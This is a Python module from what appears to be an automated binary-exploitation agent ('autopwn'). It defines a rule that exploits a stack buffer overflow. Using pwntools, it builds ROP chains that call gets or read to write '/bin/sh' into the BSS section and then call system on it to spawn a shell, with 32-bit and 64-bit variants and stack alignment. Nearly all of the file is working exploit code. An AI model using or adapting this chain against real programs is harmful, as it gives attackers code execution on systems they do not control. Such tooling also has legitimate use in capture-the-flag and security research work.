"""Rule: when system@PLT exists but no /bin/sh string, use gets/read to write it to BSS."""
from __future__ import annotations

from pwn import log, flat

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, verify_shell, interactive_or_close, safe_close


def _condition(state) -> bool:
    info = state.discovered_facts.get("system_no_binsh")
    if not info:
        return False
    ctx = state.ctx
    if ctx.overflow_offset < 0:
        return False
    if ctx.bits == 64 and not ctx.find_gadget("pop rdi"):
        return False
    return info.get("has_gets") or info.get("has_read")


def _action(state) -> ActionResult:
    ctx = state.ctx
    offset = ctx.overflow_offset
    word = ctx.bits // 8
    pop_rdi = ctx.find_gadget("pop rdi")
    ret = ctx.find_gadget("ret")

    system_plt = ctx.plt_table.get("system", 0)
    bss_addr = 0
    if ctx.elf:
        bss_addr = ctx.elf.bss() + 0x200  # safe offset into BSS

    if not system_plt or not bss_addr:
        return ActionResult(success=False, terminal=True,
                            record=AttemptRecord(strategy="system_bss", diagnosis="no_system_or_bss"))

    info = state.discovered_facts["system_no_binsh"]
    pad = b"A" * offset

    # Strategy A: gets(bss) → system(bss)
    if info.get("has_gets"):
        gets_plt = ctx.plt_table.get("gets", 0)
        if gets_plt and pop_rdi:
            io = None
            try:
                for use_align in ([True, False] if ret else [False]):
                    io = open_target(ctx)
                    try:
                        io.recv(timeout=1)
                    except Exception:
                        pass

                    if ctx.bits == 64:
                        if use_align:
                            chain = [pop_rdi, bss_addr, gets_plt,
                                     ret, pop_rdi, bss_addr, system_plt]
                        else:
                            chain = [pop_rdi, bss_addr, gets_plt,
                                     pop_rdi, bss_addr, system_plt]
                    else:
                        # 32-bit: gets(bss), then system(bss)
                        # Need a pop;ret gadget to clean up gets' arg
                        pop_ret = ctx.find_gadget("pop ebx")  # any pop;ret
                        if pop_ret:
                            chain = [gets_plt, pop_ret, bss_addr,
                                     system_plt, 0xDEADBEEF, bss_addr]
                        else:
                            chain = [gets_plt, system_plt, bss_addr, bss_addr]

                    payload = pad + flat(chain)
                    label = "gets+align" if use_align else "gets"
                    log.info(f"Agent system_bss: {label}, gets→system (bss={bss_addr:#x})")

                    # Send overflow
                    if ctx.input_type in ("gets", "direct"):
                        io.sendline(payload)
                    else:
                        io.send(payload)

                    # gets() now waits for second input — send /bin/sh
                    import time
                    time.sleep(0.3)
                    io.sendline(b"/bin/sh")

                    if verify_shell(io):
                        return ActionResult(
                            success=interactive_or_close(io, True),
                            record=AttemptRecord(strategy="system_bss", success=True),
                        )
                    safe_close(io)
                    io = None

            except Exception as exc:
                log.debug(f"system_bss gets error: {exc}")
                if io:
                    safe_close(io)

    # Strategy B: read(0, bss, N) → system(bss) — needs pop_rsi too
    if info.get("has_read") and ctx.bits == 64:
        read_plt = ctx.plt_table.get("read", 0)
        pop_rsi = ctx.find_gadget("pop rsi")
        pop_rdx = ctx.find_gadget("pop rdx")
        if read_plt and pop_rdi and pop_rsi:
            io = None
            try:
                io = open_target(ctx)
                try:
                    io.recv(timeout=1)
                except Exception:
                    pass

                chain = [pop_rdi, 0, pop_rsi, bss_addr]
                # Handle pop rsi ; pop r15
                from autopwn.exploit.chain_builder import ChainBuilder
                cb = ChainBuilder(ctx)
                extra = cb._extra_pops(pop_rsi)
                chain.extend([0] * extra)
                if pop_rdx:
                    chain.extend([pop_rdx, 0x10])
                chain.extend([read_plt])
                if ret:
                    chain.append(ret)
                chain.extend([pop_rdi, bss_addr, system_plt])

                payload = pad + flat(chain)
                log.info(f"Agent system_bss: read→system (bss={bss_addr:#x})")
                io.send(payload)

                import time
                time.sleep(0.3)
                io.send(b"/bin/sh\x00")

                if verify_shell(io):
                    return ActionResult(
                        success=interactive_or_close(io, True),
                        record=AttemptRecord(strategy="system_bss", success=True),
                    )
                safe_close(io)
            except Exception as exc:
                log.debug(f"system_bss read error: {exc}")
                if io:
                    safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="system_bss", diagnosis="all_variants_failed"),
    )


RULES = [
    ("system_bss", 85, "system@PLT without /bin/sh: write it to BSS via gets/read",
     _condition, _action),
]
